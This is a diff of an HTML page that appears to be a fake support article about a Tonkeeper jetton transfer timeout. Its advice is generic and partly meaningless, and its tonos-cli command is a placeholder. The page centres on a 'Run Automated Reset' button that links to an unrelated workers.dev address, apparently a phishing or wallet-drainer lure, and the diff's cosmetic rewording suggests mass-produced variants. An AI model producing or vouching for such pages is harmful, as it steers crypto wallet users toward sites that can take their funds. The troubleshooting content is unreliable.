@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tonkeeper Jetton Transfer Loop Timeout</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #121214;
+        font-family: BlinkMacSystemFont;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #ff9455; }
     .btn {
-        background: #00adb5;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,27 +41,28 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a "Tonkeeper Jetton transfer loop timeout" error when attempting to transfer jettons, indicating a failure in the transaction process due to a timeout in the transfer loop.</li>
+<li>The user encounters a "Tonkeeper Jetton transfer loop timeout" error when attempting to transfer jettons, indicating a failure in the transfer process due to a timeout.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to the Tonkeeper wallet's inability to complete the jetton transfer within the allotted time frame, often caused by network congestion, high gas fees, or issues with the smart contract.</li>
+<li>This error occurs due to the Tonkeeper wallet's inability to complete the jetton transfer within the specified time frame, often resulting from network congestion, high gas fees, or issues with the smart contract.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Check the current network status and gas prices to determine if high fees are causing the timeout.</li>
-<li>Adjust the transaction settings to prioritize speed over cost, if feasible.</li>
-<li>Utilize the following command to override default settings:</li>
+<li>To resolve the issue, try the following manual overrides:</li>
+<li>Increase the gas limit to prioritize the transaction</li>
+<li>Reduce the transfer amount to minimize network load</li>
+<li>Utilize an alternative transfer method, such as a different wallet or exchange</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span>&lt;wallet_address&gt;<span class="w"> </span>submitTransaction<span class="w"> </span><span class="s2">&quot;&lt;transaction_data&gt;&quot;</span><span class="w"> </span>--timeout<span class="w"> </span><span class="m">60</span>
+<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span><span class="m">0</span>:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<span class="w"> </span>JettonTransfer<span class="w"> </span><span class="s2">&quot;--input&quot;</span><span class="w"> </span><span class="s1">&#39;{&quot;dest&quot;:&quot;0:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;,&quot;amount&quot;:1000000000}&#39;</span><span class="w"> </span>--abi<span class="w"> </span>JettonWallet.abi
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced debugging and manual transaction management. </p>
+<p>Consider using a more advanced console for complex transactions. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Familiarity with the TON blockchain and its ecosystem</li>
-<li>Understanding of smart contract interactions and gas fees</li>
-<li>Access to the <code>tonos-cli</code> command-line tool</li>
+<li>Tonos-cli installed and configured</li>
+<li>Jetton wallet contract address and ABI file</li>
+<li>Sufficient TON coins for gas fees</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
